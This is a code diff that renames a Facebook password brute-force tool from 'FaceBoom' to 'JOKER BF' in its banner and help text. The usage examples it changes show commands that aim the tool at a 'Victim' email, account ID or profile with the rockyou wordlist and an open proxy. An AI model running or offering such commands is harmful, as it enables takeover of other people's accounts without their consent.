@@ -106,7 +106,7 @@ class FaceBoom(object):
         proxystatus = gr+self.useProxy+wi+"["+gr+"ON"+wi+"]" if self.useProxy  else yl+"["+rd+"OFF"+yl+"]"
         print(gr+"""
 ==================================
-[---]        """+wi+"""FaceBoom"""+gr+"""        [---]
+[---]        """+wi+"""JOKER BF"""+gr+"""        [---]
 ==================================
 [---]  """+wi+"""BruteForce Facebook  """+gr+""" [---]
 ==================================
@@ -166,15 +166,15 @@ OPTIONS:
 Examples:
         |
      |--------
-     | python faceboom.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
+     | python fbbrute.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
      |--------
-     | python faceboom.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
+     | python fbbrute.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
      |--------
-     | python faceboom.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
+     | python fbbrute.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
      |--------
-     | python faceboom.py -t Victim@gmail.com -s 1234567
+     | python fbbrute.py -t Victim@gmail.com -s 1234567
      |--------
-     | python faceboom.py -g https://www.facebook.com/Victim_Profile
+     | python fbbrute.py -g https://www.facebook.com/Victim_Profile
      |--------
 """)
 
